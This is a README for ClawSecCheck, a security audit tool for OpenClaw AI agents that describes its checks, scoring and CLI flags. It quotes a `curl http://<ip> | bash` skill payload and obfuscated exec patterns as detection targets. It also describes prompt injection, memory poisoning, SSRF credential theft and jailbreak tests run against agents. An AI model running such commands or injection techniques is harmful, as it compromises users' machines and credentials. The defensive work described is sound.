<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=32&duration=3000&pause=900&color=E34234&center=true&vCenter=true&width=660&lines=ClawSecCheck+%F0%9F%A6%9E;OpenClaw+Security+Self-Audit;Free.+Local.+Read-only.;Score+Your+Agent+A%E2%80%93F" alt="ClawSecCheck" />
</p>

<p align="center">
  <b>🦞 A free, local, read-only security self-audit for your own OpenClaw agent.</b><br>
  <sub><i>The claw that checks your claws — scores you A–F, finds the holes, hands you copy-paste fixes.</i></sub>
</p>

<p align="center">
  <a href="https://github.com/gl0di/clawseccheck/releases"><img src="https://img.shields.io/github/v/tag/gl0di/clawseccheck?label=version&color=E34234&labelColor=2b2b2b" alt="version"></a>
  <a href="https://clawhub.ai/gl0di/clawseccheck"><img src="https://img.shields.io/badge/ClawHub-clawseccheck-FF6B47?labelColor=2b2b2b" alt="ClawHub"></a>
  <img src="https://img.shields.io/badge/python-3.9%2B-E8A33D?labelColor=2b2b2b" alt="Python 3.9+">
  <img src="https://img.shields.io/badge/dependencies-zero-C1272D?labelColor=2b2b2b" alt="Zero dependencies">
  <img src="https://img.shields.io/badge/network-none-8B0000?labelColor=2b2b2b" alt="No network">
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-E34234?labelColor=2b2b2b" alt="License: MIT"></a>
  <a href="https://github.com/gl0di/clawseccheck/stargazers"><img src="https://img.shields.io/github/stars/gl0di/clawseccheck.svg?style=social" alt="GitHub stars"></a>
</p>

<p align="center">
  <b>🦞 Free&nbsp;·&nbsp;🔒 Local&nbsp;·&nbsp;👀 Read-only&nbsp;·&nbsp;🚫 No API key&nbsp;·&nbsp;🏠 Your data never leaves your machine</b>
</p>

---

A one-command security self-audit for *your own* OpenClaw agent. It scores your setup
**A–F**, surfaces the most urgent holes in plain language, and gives copy-paste fixes —
plus a **shareable grade badge**.

Because you run it on your own agent, there's no "scanning someone else" problem: no
proof-of-ownership, no legal grey area.

---

## 🔒 Local, read-only, and honest about its limits

ClawSecCheck runs **locally and read-only** — no network calls, no telemetry, nothing
leaves your machine. It's a heuristic audit, so it's upfront about what it does and
doesn't check:

**Honest limits (we never hide these behind a green score):**

- **Static analysis, not runtime-verified.** Findings describe your *configuration*, not a
  live exploit. Results are labelled accordingly.
- **`UNKNOWN` ≠ `PASS`.** If a file can't be read, the config can't be parsed, or a state
  can't be determined, it's reported as `UNKNOWN` and excluded from the score — never
  silently marked safe.
- **Some deep checks are planned, not shipped yet:** a dirty-input action-gate and taint-tracking
  layer (B27–B28) is on the roadmap, and the shipped B33 version gate is seeded with a small set of
  grounded advisories — its table grows as new ones are verified, not an exhaustive CVE database yet.
- **Vetting the scanner itself** (`--vet` pointed at ClawSecCheck's own source) reports
  *safe with a note* — a security tool necessarily ships attack signatures as data.

**Found a false positive/negative or something confusing?** Open an issue at
<https://github.com/gl0di/clawseccheck/issues> with the output of `clawseccheck --json`
(it redacts secret *values* — only key names/paths appear) and your OpenClaw version. Do
not paste raw secrets.

---

## ⚠️ Important — trust no one (including this skill)

OpenClaw skills are **not sandboxed**: an installed skill runs with your agent's full
permissions. The ClawHavoc campaign poisoned ClawHub with **hundreds of malicious skills**
that steal credentials and crypto wallets — a single line of markdown can hide a
`curl http://<ip> | bash`.

So, before you download, install, or use **any** skill (this one included):

1. **Read the source** — it's plain text. If you can't see what it does, don't run it.
2. **Have your agent analyse it for you** — ask OpenClaw to review the skill's `SKILL.md`
   and scripts for shell-exec, credential access, paste-host uploads, and obfuscated
   (base64) payloads *before* enabling it. ClawSecCheck does this with `--vet <skill>`.
3. **Pin a known release**, prefer signed / VirusTotal-clean skills, and rotate any secret a
   skill could have reached if you ever suspect it.

ClawSecCheck practises this: it is open source, zero-dependency, read-only, and its **B13** check
does exactly this vetting on the skills you've *already* installed. Trust is earned by being
readable — so read it.

---

## 🤔 Why another audit tool?

The built-in `openclaw security audit` and tools like Trent/ClawSec are good — but:

- The native audit **does not inspect the content of your bootstrap files**
  (`SOUL.md`, `AGENTS.md`, `TOOLS.md`): they're injected into the system prompt as *trusted
  context* with no validation. ClawSecCheck **does** check them for prompt-injection-prone
  directives (our check **B6**).
- ClawSecCheck is **100% local** — no API key, nothing transmitted (Trent uploads your config;
  the native one is CLI-only).
- It leads with a **shareable Score + Grade + Lethal Trifecta ratio** you can post to the
  community — without ever exposing your actual findings.

---

## 🔬 What it checks

- **Lethal Trifecta** (untrusted input × sensitive data × outbound actions — keep ≤2 of 3)
- Gateway exposure & channel auth, plaintext secrets, least privilege, execution sandbox,
  plugin/skill supply-chain integrity, bootstrap-file injection surface, memory poisoning,
  human approval, secret-leak/redaction, TLS, local-first/model hygiene.
- **B13 — installed-skill / plugin vetting:** scans the *content* of skills you downloaded
  (not made yourself) for the ClawHavoc malware class, including base64-hidden payloads. As of
  v0.21 it also runs a static **Python AST** pass (stdlib `ast`, parse-only — never executed) that
  catches obfuscation regex misses — `exec(base64.b64decode(...))`, `getattr(os,"sys"+"tem")(...)`,
  `__import__("os").system(...)` — plus prompt-injection / hide-from-user directives embedded in a
  third-party skill's prose, and (v0.23) a **taint trace** that flags a credential **file's** contents
  (`~/.ssh/id_*`, `.aws/credentials`, keychain, wallet, …) flowing into a network sink ("read a secret
  file → send it out"). Sources are credential files only, not env vars, so the legit "read
  `OPENAI_API_KEY`, send as auth header" pattern is never flagged. (AST is Python-only; JS/shell stay
  on the regex engine.)
- Per-check reference: [`docs/CHECKS.md`](docs/CHECKS.md) for the generated catalog of checks,
  verdict semantics, remediation, and compound risk chains.
- **B14 — egress surface:** where the agent can reach out (channels, external skills, tools).
- **B15 — MCP server trust** boundaries.
- **B16 — threat monitoring:** whether you actually have monitoring/detection set up at all.
- **B17 — autonomy / heartbeat:** whether the agent acts on its own and could be steered by untrusted input.
- **B18 — subagent delegation:** whether spawned subagents can wield elevated/exec tools without approval.
- **B45 — per-agent privilege separation (attestation):** A1 flattens the whole setup into one
  capability surface; B45 reads the attested agent roster (`--attest`, `agents: [{name, tools}]`) and
  checks whether any *single* agent holds all three trifecta legs by itself. OpenClaw config has no
  per-agent tool allowlist, so this needs the self-report — `UNKNOWN` without it, advisory (`ATTESTED`,
  unscored). PASS means "no single agent is the full trifecta" — a necessary condition, **not** a
  guarantee: runtime data-flow and the delegation graph are out of scope.
- **B46 — multi-agent trifecta exposure:** config-only nudge — spawnable subagents **plus** the global
  trifecta **plus** no exec approval gate. Capped at WARN (never a new FAIL).
- **B47 — cross-agent trifecta reassembly (attestation):** even when no single agent is the trifecta,
  it can reassemble across delegation (a *confused deputy*): an untrusted-input agent that can drive a
  sensitive-data agent and an outbound agent. Reads the attested `delegation: [{from, to, returns}]`
  graph; the `returns` tier decides exploitability — a `schema` (typed) return is a **wall** that
  blocks the channel (PASS, with a not-runtime-verified caveat), while `raw`/`filtered`/`unknown`
  carries it (WARN). UNKNOWN without `--attest`. `RISK-11` narrates the chain. Runtime data-flow stays
  out of static scope.
- **B19 — data at-rest:** group/world-readable memory/log directories (conversation data / PII exposure).
- **B20–B24 — agent behavior:** write-protection of identity/memory files, tool-output trust boundary,
  self-modification risk, approval-bypass directives, and deep MCP-server hardening.
- **B30 — sender identity strength:** flags `channels.<provider>.dangerouslyAllowNameMatching`
  (allowlist keyed on mutable display name — trivially bypassed by renaming) and
  `channels.telegram.includeGroupHistoryContext="recent"` (untrusted group history injected as context).
- **B32 — control-plane mutation reachability:** flags control-plane tools (`cron`, `config.apply`,
  `update.run`, `sessions_spawn`, `sessions_send`, `gateway`) exposed via `gateway.tools.allow`
  over the HTTP gateway — full agent takeover without further escalation.
- **B38 — browser / SSRF exposure:** flags `browser.ssrfPolicy.dangerouslyAllowPrivateNetwork`
  (cloud-metadata IP access / credential theft via 169.254.169.254) and `browser.noSandbox`
  (headless browser without OS isolation); warns when no `hostnameAllowlist` limits egress.
- **B48 — dangerous break-glass overrides:** a grounded registry of OpenClaw's `dangerously*` /
  `allowUnsafe*` toggles that are documented "keep disabled." **FAIL** when a sandbox-escape
  (`sandbox.docker.dangerouslyAllow{ContainerNamespaceJoin,ExternalBindSources,ReservedContainerTargets}`)
  or control-plane auth-bypass (`gateway.controlUi.dangerouslyDisableDeviceAuth`) flag is active;
  **WARN** for the rest (webhook signature disable, host-header origin fallback, external embeds,
  real-IP fallback, `allowUnsafeExternalContent`, per-channel/plugin private-network access, extra
  node commands). Default/absent = clean PASS (zero false positives on a stock config).
- **B39 — session visibility / cross-user transcript leak:** flags `session.dmScope="main"`
  (all DM peers share one session — cross-user contamination) and `tools.sessions.visibility`
  of `"agent"` or `"all"` (cross-session transcript reads).
- **B26 — untrusted-context exposure:** flags `channels.<provider>.contextVisibility="all"` (the
  OpenClaw default), where quoted/thread/history text from non-allowlisted senders is injected into
  the model as context — a prompt-injection surface; recommends `allowlist`/`allowlist_quote`.
- **B33 — known-vulnerable version gate:** compares `meta.lastTouchedVersion` against a maintained
  OpenClaw advisory table (seeded with GHSA-g8p2-7wf7-98mq, fixed `2026.1.29`); unknown versions are
  `UNKNOWN`, never `PASS`.
- **B41 — credential blast-radius:** inventories the credential surface (`auth.profiles.*`,
  gateway token) reachable by the agent and warns when it co-exists with untrusted ingress + outbound
  tools. Reports only provider names + counts — never the account/email or token value.
- **B31 — effective-tools bypass:** detects the OpenClaw footgun where `tools.deny: ["write"]` does
  not deny `apply_patch`/`exec` — a believed-safe restriction that still allows file mutation; checks
  global, `toolsBySender`, and per-agent deny lists. Recommends `group:fs` or a complete deny list.
- **B42 — skill/plugin install-time policy:** install-time supply-chain risk that isn't malware
  per se — `package.json` `pre/postinstall` hooks that run code on install **and every auto-update**
  (unsandboxed, with the agent's permissions), and **world-writable skill directories** (any local
  user could drop a skill the agent loads). WARN-max, never FAIL; complements B25 (pinning) and B13
  (content).
- **B50–B54 — Host Watch Posture:** widens the lens past the agent to the *machine it runs on* —
  is anyone watching it? Read-only, filesystem-only detection (no subprocess, no network) of host
  defensive monitors: **B50** network monitoring / IDS (Suricata, Zeek, Snort, Little Snitch,
  Sysmon), **B51** host audit / syscall logging (auditd, OpenBSM, Sysmon), **B52** file-integrity
  monitoring (AIDE, Tripwire, osquery), **B53** endpoint protection / EDR (Wazuh, CrowdStrike,
  ClamAV, Defender, Santa), **B54** host firewall (ufw, firewalld, nftables, macOS ALF, Windows
  Firewall). LOW severity, **never FAIL**: a missing monitor is a WARN only when the agent is
  high-privilege, otherwise PASS; anything not determinable read-only is `UNKNOWN`. Where it can be
  read without running a command, it distinguishes *enabled* from merely *installed*.
- **B55 — filesystem-write tool exposure:** advisory warning when broad write-capability (`fs_write`,
  `apply_patch`) is granted without enough scoping controls.
- **B56 — dangerous Control-UI cross-origin policy:** flags `allowedOrigins: ["*"]` in control UI config.
- **B57 — plugin auto-approve:** flags `permissionMode: "approve-all"`, which bypasses explicit
  per-action confirmation in plugin execution.
- **B58 — Unicode-obfuscated injection / hidden-text evasion:** detects Unicode confusables, zero-width and
  bidi controls used to hide injection directives.
- **B59 — markdown-image / anchor data-exfil signals:** flags remote markdown image/anchor URLs with data-bearing
  query params that can leak context.
- **B60 — prompt self-replication / propagation directives:** catches prompt-level instructions that try
  to make injected content propagate itself.
- **B61 — cross-agent config snooping / credential theft:** flags cross-agent access to foreign agent
  identity/config paths combined with extraction capabilities.
- **B62 — capability–intent mismatch:** detects large drift between SKILL.md declared purpose and actual
  observed behavior from static and effect profiling.
- **B63–B66 — instruction hardening checks:** hidden directive / hierarchy override / sleeper trigger /
  persona-role jailbreak coverage.
- **C6 — hook-composition policy drop (legacy):** advisory `UNKNOWN` for pre-v2026.6.10 hook chains where
  policy drop order can behave unexpectedly.
- **B43 / B44 — capability blast-radius (attestation layer):** the static scan reads config files
  only; it cannot see the agent's *real tool/verb inventory* — config lists tool *names* as opaque
  strings. The attestation layer closes that: `--ask` emits a template the running agent fills with
  its own ground truth, and `--attest <file>` feeds it back. **B43** classifies the held verbs by
  blast radius — `EXEC` (bash/shell/exec — the broadest: subsumes egress+destruction),
  `MAILBOX_CONFIG` (auto-forward/filter/delegation — a persistent silent channel),
  `DESTRUCTIVE` (delete-forever/purge), `EGRESS` (send/forward/post), `REVERSIBLE`
  (search/get/draft/label). A reversible-only toolset *passes* (forward-exfil and delete-evidence
  are physically impossible); a high-blast verb that can fire without approval *fails*. **B44**
  cross-checks the self-report against the config `tools.allow` and flags a high-blast verb the
  config grants but the agent omitted (drift / blind spot / masking). Both at `ATTESTED` confidence —
  a self-report is weaker evidence than a config fact, so they are advisory and never override one.
  Read-only and introspective: the agent reports what it holds, it never *exercises* a verb to test it.
  The attestation `paths` block additionally lets the agent point B20/C5 at where its identity/memory
  files and OpenClaw install really live — discovery only: the agent supplies *where*, the engine still
  `stat()`s the path itself, so those permission findings keep full file-stat strength (not `ATTESTED`).
- **B20 / C5 — at-rest write protection:** B20 flags group/world-writable bootstrap/identity/memory
  files (`SOUL.md`/`AGENTS.md`/`TOOLS.md`/`MEMORY.md`) in the home root **and** the workspace dirs;
  C5 flags a group/world-writable openclaw binary dir, its install-tree ancestors (e.g. the npm
  package root — a binary-replacement vector), and writable PATH dirs before it. Sticky dirs like
  `/tmp` are exempt (the sticky bit blocks cross-owner replacement).
- Plus your platform's own **`openclaw security audit`**, run for you and merged in.

**Mapped to OWASP.** Each check is tagged with its **OWASP Top 10 for LLM Applications (2025)**
category (surfaced per finding in `--json` as `"owasp": [...]`), and the checks are mapped to the
agent-specific **OWASP Agentic (ASI)** threat classes — tool misuse, multi-agent identity/privilege
abuse, insecure inter-agent communication, cascading blast-radius — that an app-code reviewer never
sees. Full matrix in [`docs/THREAT_COVERAGE.md`](docs/THREAT_COVERAGE.md).

---

## 🧩 Built-in audit, included for you

Non-technical users will never open a terminal to run OpenClaw's own
`openclaw security audit`. So ClawSecCheck runs it **for you** (read-only) and folds its
findings into the same plain-language report — one button shows both ClawSecCheck's checks
*and* the platform's own audit. Native findings are shown but are **not** mixed into the
ClawSecCheck score (kept deterministic). Disable with `--no-native`.

---

## 🛡️ Trust / provenance

ClawSecCheck is **open source and zero-dependency (Python stdlib only)**. Its own checks are
**read-only and offline** — they make **no network calls** and never touch your OpenClaw config.
**Nothing ever leaves your machine.** Full read scope:

- `~/.openclaw/openclaw.json` and workspace bootstrap files (`SOUL.md`, `AGENTS.md`, etc.)
- text of installed skills/plugins (Python files are AST-parsed, never executed)
- `~/.openclaw/logs/config-audit.jsonl` and `config-health.json` (B77/B78 log checks)
- `~/.openclaw/agents/.../sessions/*.jsonl` (B79 approval-policy posture)
- host OS path-existence checks for IDS/FIM/EDR/firewall config (B50–B54)
- credential-store path-existence inventory: whether `.env`, SSH key dirs, keychain/keyring
  directories, and browser cookie stores **exist** near the agent home — contents never read The only thing it writes by default is a one-line
entry to a **private, owner-only** local score history (`~/.clawseccheck/history.jsonl`) so you can
track your grade over time — opt out with `--no-history`. Everything else is written only when you
ask: a report file (`--save`), the `--monitor` snapshot and change journal
(`~/.clawseccheck/state.json`, `events.jsonl`), a badge (`--badge`), HTML/SARIF (`--html`/`--sarif`),
a log (`--log`), and a small freshness ledger (`~/.clawseccheck/coverage.json`) recording when you
last ran an active self-test (`--canary`/`--redteam`/`--dryrun`/`--self-test`/`--vet-mcp`).

The **only** external command it can run is your own, fixed and read-only:

```text
openclaw security audit --json
```

No shell, never `--fix`, with a timeout; skip it entirely with `--no-native`. The entire
source is in [`clawseccheck/`](clawseccheck/) — read it before you trust it. Amid the ClawHavoc
malicious-skill wave, an audit skill should prove its own safety; this one does.

---

## 🚀 Install & run

```bash
openclaw skills install clawseccheck            # from ClawHub (the slug is unique)
openclaw skills install git:gl0di/clawseccheck  # or straight from GitHub
# then ask your agent: "audit my OpenClaw setup with clawseccheck"
```

Skill page on ClawHub: **<https://clawhub.ai/gl0di/clawseccheck>**.

Or install it as a standalone CLI (zero dependencies):

```bash
pipx install git+https://github.com/gl0di/clawseccheck   # or: pip install .
clawseccheck --home ~/.openclaw                            # then just `clawseccheck`
python -m clawseccheck                                     # also works
```

Or run the bundled script directly (Linux/macOS):

```bash
python3 audit.py                 # human report + shareable card
python3 audit.py --json          # machine-readable
python3 audit.py --card          # just the badge
python3 audit.py --ascii         # plain output (no unicode icons/box)
python3 audit.py --home ~/.openclaw
```

On **Windows** use `python` (or `py`); the script auto-detects consoles that can't render
unicode and falls back to ASCII, or force it with `--ascii`:

```bat
python audit.py
py audit.py --card --ascii
```

Cross-platform: pure Python stdlib, pathlib-based paths, POSIX file-permission checks are
skipped on Windows (NTFS uses ACLs), and all output has an ASCII fallback.

---

## 🦞 The OpenClaw ecosystem

ClawSecCheck is one skill in a fast-growing OpenClaw ecosystem — and that growth is exactly
why a local, read-only vetting tool exists. Browse more, but **vet before you trust**:

| | Resource | What it is |
|---|---|---|
| 🦞 | **[ClawHub — clawseccheck](https://clawhub.ai/gl0di/clawseccheck)** | This skill's page — install, current version, changelog |
| 📚 | [awesome-openclaw-skills](https://github.com/VoltAgent/awesome-openclaw-skills) | 5,300+ community skills, organized by category |
| 🤖 | [awesome-openclaw-agents](https://github.com/mergisi/awesome-openclaw-agents) | Agent templates, real-world use cases & integrations |
| 🛡️ | [OpenClaw gateway security docs](https://docs.openclaw.ai/gateway/security) | The platform's own hardening guide |

> 🦞 **Before installing anything from these lists** (this skill included): read the source,
> vet it — `clawseccheck --vet <path>` — and pin a known release. The ClawHavoc wave proved
> that *"popular on a list"* is not the same as *"safe to run."*

---

## 🔄 Updating

OpenClaw remembers where a skill came from, so users get your new versions by updating:

```bash
openclaw skills update clawseccheck   # pull the latest from its source (Git/ClawHub)
clawhub update --all                  # update every installed skill
```

(Or re-run the install command.) An auto-updater skill / `update.auto.enabled` in
`~/.openclaw/openclaw.json` can update on a schedule. Because skills run with the agent's full
permissions, a malicious *update* is a real supply-chain risk — so each release here is tagged
and the source is public to read **before** updating. Prefer reviewing/pinning a tag over blind
auto-update for anything security-sensitive.

> **First call after an update looks empty?** Some OpenClaw versions reload a freshly-updated
> skill lazily, so the *first* invocation right after an update can return nothing; just run it
> again. This is an OpenClaw skill-reload timing artifact on the runtime side, not the audit —
> confirm the engine is live with `clawseccheck --verify-self`.

**Staleness reminder (offline).** A stale security scanner is itself a risk, so the default report
may print a one-line "your build may be out of date" notice. It is **100% offline** — it reads only
the local clock against the baked-in build date, plus an optional local hint file
`~/.clawseccheck/latest.json` that your distribution layer or agent may write. ClawSecCheck **never
checks for its own updates over the network** (that would break its zero-network promise and it
would have to flag itself). The actual "is there a newer version?" lookup belongs to your package
tooling or your agent — see SKILL.md "Keeping ClawSecCheck current". Silence the notice with
`--no-update-notice` or `CLAWSECCHECK_NO_UPDATE_NOTICE=1`; after any update, verify the engine with
`--verify-self`.

---

## 🧭 Guided mode

When you run ClawSecCheck inside OpenClaw, the agent walks you through the entire audit
conversationally — you never need to know a flag. After every default run, ClawSecCheck prints a
short **"What you can do next"** block: a prioritised list of the most relevant follow-up steps
for *your* findings, with the exact command to run each one.

The same list is available two other ways:

```bash
python3 audit.py --next          # print the next-steps block only (after running the audit)
python3 audit.py --json          # includes a "next_actions" array in the JSON envelope
```

The recommendations are driven by your actual results — open FAIL findings surface `--prompts`
first; unvetted third-party skills surface `--vet`; no monitoring detected surfaces `--monitor`;
and so on. When there is nothing urgent, the block tells you so and suggests the lighter follow-ups
(trend tracking, grade sharing).

**ClawSecCheck never applies a fix or changes your config.** For every open finding, `--prompts`
gives you a ready copy-paste prompt to hand to your agent (or apply yourself); the change is
yours to make. Everything stays local.

**`--fix` — paste-ready remediation.** Prints the exact, copy-paste fixes for your current
FAIL/WARN findings: safe shell commands (e.g. `chmod 600 ~/.openclaw/openclaw.json`) and
config guidance (`set tools.exec.mode → "ask"`). It is **output only** — ClawSecCheck does not
apply anything; you review and run it. Config fixes are given as *set this dotted path to this
value* guidance (so you edit your own `openclaw.json`), never a paste-over JSON blob that could
clobber your other keys. Also surfaced per finding in `--json` (`"remediation"`) and SARIF (`fixes`).

---

## 📋 How you get the report

When you run the skill inside OpenClaw, the agent executes `audit.py`, captures its output,
and shows it to you **right there in the chat** — no terminal, no setup. You see:

1. your **Score / Grade / Lethal Trifecta** ratio,
2. the **fix list, most urgent first**, in plain language, and
3. a **shareable card** — grade + score + Lethal Trifecta ratio, safe to post (the findings stay
   private; `--badge` writes the same grade + score as an SVG).

To keep a copy, add `--save report.txt` and ClawSecCheck writes the full report to that file
(written only when you ask). For automation, `--json` gives a machine-readable result.

---

## 📡 Threat monitoring

Two complementary things:

**B16 — do you have monitoring at all?** ClawSecCheck checks whether you have threat
monitoring/detection set up — an agent with none won't alert you if it's compromised. B16 looks
for a monitoring skill/plugin (ClawSec, `openclaw-security-monitor`, …) or monitoring/alerts
config; if none is found it warns you and tells you how to add one.

**`--monitor` — Agent Watch.** One way to *get* monitoring: re-audit on a schedule and alert,
**by severity**, on what **changed** — a new or modified installed skill, `SOUL.md` drift, a dropped
score, a check going PASS → FAIL, **a newly connected MCP server, a new channel, the gateway becoming
network-exposed, or a host monitor disappearing**. Each run appends the changes to a private local
journal (`~/.clawseccheck/events.jsonl`, owner-only, never uploaded); view the timeline with
`--watch-log`. (Drift detection is upgrade-safe: an older snapshot never produces spurious
"new connection" alerts.)

```bash
python3 audit.py --monitor                 # first run = baseline, then alerts on changes
python3 audit.py --monitor --state ~/.clawseccheck/state.json
```

Schedule it via OpenClaw's heartbeat or cron; when an alert fires, have your agent message you.
It stores one small snapshot at `~/.clawseccheck/state.json`. (Scheduled re-audit + drift
detection — not a real-time runtime IDS; that heavier model is intentionally out of scope.)

---

## ⛓️ Highest-risk paths

Beyond individual checks, ClawSecCheck runs a **risk engine** that looks for dangerous
*combinations* — capability chains where two or more co-occurring properties make a
compromise catastrophic or trivial to execute.

The highest-risk chains it detects now span **RISK-01 through RISK-16**:

| ID | Severity | Chain |
|----|----------|-------|
| RISK-01 | CRITICAL | Untrusted sender (open DM/group) → exec/write/elevated tool → host/filesystem |
| RISK-02 | HIGH | Untrusted input → sensitive data reachable → outbound/exec (Lethal Trifecta) |
| RISK-03 | HIGH | Untrusted ingress + no execution sandbox → exec/write directly on host |
| RISK-04 | HIGH | Mutable agent identity (name-matching) → elevated/exec tools → privilege escalation |
| RISK-05 | HIGH | Browser SSRF to private network → secrets/credentials → exfiltration |
| RISK-06 | CRITICAL | Open/untrusted surface → control-plane endpoint → full agent takeover |
| RISK-07 | HIGH | Exec/write tool (no approval gate) → writable bootstrap/identity files → persistent compromise |
| RISK-08 | MEDIUM | Multi-user channel → shared session (`dmScope="main"`) → cross-user data leak |
| RISK-09 | CRITICAL | Malicious installed skill (B13 fail) → reachable secrets/data → outbound egress → exfiltration |
| RISK-10 | MEDIUM | Untrusted input → agent can exec/write on host → no host detection (IDS/audit/FIM/EDR) → a breach would be invisible |
| RISK-11 | HIGH | Cross-agent trifecta reassembly (confused deputy): untrusted-input agent → drives a sensitive-data agent → drives an outbound agent across non-wall delegation edges |
| RISK-12 | HIGH | Untrusted input + broad/unscoped write capability (B55) → filesystem tamper/persistence |
| RISK-14 | HIGH | Wildcard-elevated sender + heartbeat → self-escalating autonomy loop |
| RISK-15 | HIGH | Untrusted context + browser SSRF to private network → metadata/credential exfiltration |
| RISK-16 | HIGH | RW workspace + host bind + plaintext gateway credential path → control-plane takeover |

Each chain fires **only when every link has positive evidence** — no chain is invented from
absent or UNKNOWN data, so findings are evidence-gated, which keeps false positives low —
but this is a heuristic audit, not a guarantee; manual review is still required. The risk
engine does not change the deterministic A–F score; it surfaces separately so you can see
the worst-case paths at a glance without score inflation.

```bash
python3 audit.py --risk-paths       # print the highest-risk chains section only
python3 audit.py --json             # includes a "risk_paths" array in the JSON envelope
```

The `--risk-paths` output is also appended to the default report when any chain fires.

---

## ⚙️ CI / automation

```bash
python3 audit.py --sarif results.sarif      # write SARIF 2.1.0 locally (for GitHub Code Scanning upload step)
python3 audit.py --fail-under 70            # exit 1 if score < 70 (use in CI pipelines)
python3 audit.py --exit-code                # exit 1 if any unsuppressed FAIL finding
```

The SARIF file is written to the path you choose — ClawSecCheck never uploads it anywhere.
`--fail-under` and `--exit-code` do not change the default exit code (0) when omitted,
preserving backward compatibility.

---

## 🧰 More tools

**Quick CLI reference** (every flag is local & read-only against your config):

| Need | Command |
|---|---|
| Human report | `clawseccheck` |
| JSON / SARIF output | `clawseccheck --json` · `clawseccheck --sarif results.sarif` |
| Paste-ready fixes | `clawseccheck --fix` |
| Highest-risk chains | `clawseccheck --risk-paths` |
| Vet a skill before install | `clawseccheck --vet ./skill` |
| Vet connected MCP servers | `clawseccheck --vet-mcp` |
| Active injection self-test | `clawseccheck --canary` · `clawseccheck --redteam` · `clawseccheck --dryrun` |
| Monitor drift / view timeline | `clawseccheck --monitor` · `clawseccheck --watch-log` |
| Attestation template / feed it back | `clawseccheck --ask` · `clawseccheck --attest attest.json` |
| Shareable card / SVG badge | `clawseccheck --card` · `clawseccheck --badge badge.svg` |
| Trend & percentile | `clawseccheck --trend` · `clawseccheck --percentile` |
| Accept a finding (show suppressed) | edit `.clawseccheckignore` · `clawseccheck --show-suppressed` |
| Skip native audit / host posture | `clawseccheck --no-native` · `clawseccheck --no-host` |
| Disable local history / age notice | `clawseccheck --no-history` · `clawseccheck --no-update-notice` |
| CI gate | `clawseccheck --fail-under 70` · `clawseccheck --exit-code` |
| Verify the engine itself | `clawseccheck --verify-self` |

```bash
python3 audit.py --next                    # print the "What you can do next" guidance block only
python3 audit.py --vet ./some-skill        # vet a skill (dir or SKILL.md) BEFORE installing it
python3 audit.py --vet ./some-skill --json # same, machine-readable (verdict + findings); --sarif PATH for CI
python3 audit.py --vet-mcp                 # vet connected MCP servers for supply-chain risk BEFORE trusting them
python3 audit.py --canary                   # active prompt-injection self-test (battle-tested)
python3 audit.py --redteam                   # a multi-scenario adversarial payload suite (incl. tool-poisoning, MCP-response injection, memory-poisoning, multi-agent, approval-bypass, dirty-to-exfil)
python3 audit.py --dryrun                     # runtime behavioral test (fake secret + fake tools; sources: email, web, MCP response, memory, subagent)
python3 audit.py --badge badge.svg          # write a shareable SVG grade badge
python3 audit.py --html report.html         # standalone HTML report (private — owner view)
python3 audit.py --verify-self               # SHA-256 of ClawSecCheck's own source (anti-tamper)
python3 audit.py --prompts                   # a copy-paste "ask your agent to fix it" per finding
python3 audit.py --trend                     # print local score trend (stored in ~/.clawseccheck/history.jsonl)
python3 audit.py --percentile                # show where your score sits vs. an offline reference profile
python3 audit.py --history ~/.clawseccheck/history.jsonl  # custom history file path (default shown)
python3 audit.py --verbose                   # INFO-level log to stderr (secrets redacted)
python3 audit.py --debug                     # DEBUG-level log to stderr (secrets redacted)
python3 audit.py --log audit.log            # also write log to a local file
```

- **`--next`** prints the "What you can do next" guidance block on its own — runs the audit
  first, then shows only the prioritised next-steps list. Same content as the block appended to
  the default report; useful if you want to re-check recommendations without re-reading the full
  report.
- **`--vet PATH`** runs the B13 malware scan on a skill *before* you install it (point it at a
  downloaded folder or `SKILL.md`; for a URL, clone it first, then vet the local copy). Verdict:
  SAFE / SUSPICIOUS / DANGEROUS. Add `--json` for a machine-readable verdict + findings (no score —
  vetting isn't a scored audit), or `--sarif PATH` to drop a SARIF file for CI / code scanning;
  exit code is `1` on SUSPICIOUS/DANGEROUS so `--vet … || fail` gates an install pipeline.
- **`--vet-mcp`** vets every MCP server listed under `mcp.servers.*` for supply-chain risk
  *before* you trust it. Flags unpinned installs (`npx @latest`, unversioned packages), `curl|sh`
  bootstrap, plaintext-HTTP remote transports, env-variable secret passthrough, and overly broad
  OAuth scopes. Verdict per server: SAFE / SUSPICIOUS / DANGEROUS. Local and read-only — no
  network calls, no writes. Targets the #1 agent supply-chain gap: most tools audit your skills
  but not the MCP servers wired into your agent.
- **`--canary`** emits a benign injection hidden in untrusted-looking content; feed it to your
  agent — if the agent echoes the token, it obeyed an injection (**VULNERABLE**), otherwise
  **RESISTANT**. This is the live "battle-tested" complement to the passive checks.
- **`--badge PATH`** writes a shields-style SVG (grade + score only) for your README / posts.
- **`--prompts`** turns every finding into a ready prompt you paste into your agent to fix it.
- **`--trend`** records the current audit result to a local append-only history file and prints
  a table of past scores with per-run arrows. History stays on your machine only.
- **`--percentile`** compares your score against a bundled offline reference profile — no network,
  no telemetry.
- **`--verbose` / `--debug` / `--log PATH`** activate structured local logging. Config values
  that may hold secrets are redacted before being written (practising ClawSecCheck's own B9/B10).

---

## ✅ Baseline (accepting findings)

Reviewed a finding and decided it's acceptable? Add it to `~/.openclaw/.clawseccheckignore` —
one entry per line, either a check id (`B14`) or a finding fingerprint (`B14:ab12cd34`, shown
with `--show-suppressed`). Suppressed findings drop out of the **score**, the **report**, and
**monitor** alerts — so re-runs and `--monitor` stop nagging about things you've accepted.

```text
# ~/.openclaw/.clawseccheckignore
B14            # accept the egress-surface advisory
B12:1a2b3c4d   # accept one specific local-model finding
```

---

## 📊 Scoring

Weighted pass-rate (CRITICAL=10, HIGH=6, MEDIUM=3, LOW=1). **Honesty hard-caps:** any open
CRITICAL caps the score at 49, any open HIGH at 79 — you can never show an "A" with a critical
hole. Grades: A 90+ · B 80–89 · C 70–79 · D 50–69 · F <50. The shareable card shows **only the
grade + score + trifecta ratio — never the findings** (sharing must not hand attackers your map).

---

## 📐 Public API & stability

As of **1.0.0**, the following is a **frozen contract**: breaking it requires a **major** version
bump (SemVer). The freeze was cut after the attestation layer settled, an adversarial review, and
four field runs whose every finding was fixed or deliberately documented — with zero hard false
positives on real configs.

> A planned **2.0.0** will deliberately exercise this rule — batching the accumulated breaking changes (e.g. English-only output, finalized grade semantics, schema tidy) into one major bump. Until then, 1.x stays additive.

**Frozen contract (breaking these → major bump):**

